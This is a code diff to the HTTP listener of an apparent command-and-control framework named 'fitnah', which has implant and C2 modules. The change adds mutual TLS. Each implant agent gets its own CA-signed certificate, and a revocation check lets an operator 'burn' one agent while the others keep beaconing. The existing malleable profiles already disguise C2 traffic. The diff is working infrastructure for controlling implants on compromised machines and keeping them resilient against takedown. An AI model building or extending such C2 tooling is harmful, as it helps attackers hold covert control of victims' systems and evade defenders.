@@ -7,6 +7,9 @@ Endpoints (default, overridden by C2Profile if set):
 
 Supports AES-256-GCM encrypted bodies (X-Encrypted: 1 header).
 Supports TLS via ssl stdlib; auto_tls=True generates a self-signed cert.
+Supports mTLS via mtls=True: each agent gets a unique CA-signed leaf cert
+  at build time (see fitnah/c2/certs/cert_authority.py). Burning one agent
+  revokes only that leaf — all other agents continue beaconing.
 Supports malleable C2 profiles (C2Profile) for URI/header disguise.
 """
 from __future__ import annotations
@@ -24,6 +27,7 @@ from fitnah.implant.core.crypto import ImplantCrypto
 
 if TYPE_CHECKING:
     from fitnah.c2.profiles import C2Profile
+    from fitnah.c2.certs.cert_authority import CertAuthority
 
 log = logging.getLogger(__name__)
 
@@ -38,6 +42,8 @@ class HTTPListener:
         tls_cert: str = "",
         tls_key: str = "",
         auto_tls: bool = False,
+        mtls: bool = False,
+        cert_authority: "CertAuthority | None" = None,
         profile: "C2Profile | None" = None,
     ):
         self._host       = host
@@ -47,6 +53,8 @@ class HTTPListener:
         self._tls_cert   = tls_cert
         self._tls_key    = tls_key
         self._auto_tls   = auto_tls
+        self._mtls       = mtls
+        self._ca         = cert_authority
         self._profile    = profile
         self._pending_tasks: dict[str, list] = {}  # agent_id → [task, ...]
         self._runner     = None
@@ -118,12 +126,23 @@ class HTTPListener:
                     log.warning("[http] auto_tls: cert generation failed — falling back to plain HTTP")
                     return None
 
-        if cert and key:
-            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-            ctx.load_cert_chain(cert, key)
-            log.info("[http] TLS enabled (cert=%s)", cert)
-            return ctx
-        return None
+        if not cert:
+            return None
+
+        # ── mTLS mode: require client cert signed by Fitnah CA ───────────────
+        if self._mtls and self._ca:
+            try:
+                ctx = self._ca.server_ssl_context(cert, key)
+                log.info("[http] mTLS enabled — client cert required (Fitnah CA)")
+                return ctx
+            except Exception as exc:
+                log.warning("[http] mTLS setup failed (%s) — falling back to server-only TLS", exc)
+
+        # ── Plain server TLS ─────────────────────────────────────────────────
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        ctx.load_cert_chain(cert, key)
+        log.info("[http] TLS enabled (cert=%s)", cert)
+        return ctx
 
     # ── lifecycle ─────────────────────────────────────────────────────────────
 
@@ -305,4 +324,13 @@ class HTTPListener:
         return web.Response(body=enc_body, headers=resp_headers)
 
     def _auth_ok(self, request) -> bool:
-        return request.headers.get("X-Agent-Key", "") == self._auth_key
+        # Standard token check
+        if request.headers.get("X-Agent-Key", "") != self._auth_key:
+            return False
+        # mTLS revocation check — reject if this agent's cert was burned
+        if self._mtls and self._ca:
+            agent_id = request.headers.get("X-Agent-Id", "")
+            if agent_id and self._ca.is_revoked(agent_id):
+                log.warning("[http] rejected revoked agent: %s", agent_id)
+                return False
+        return True
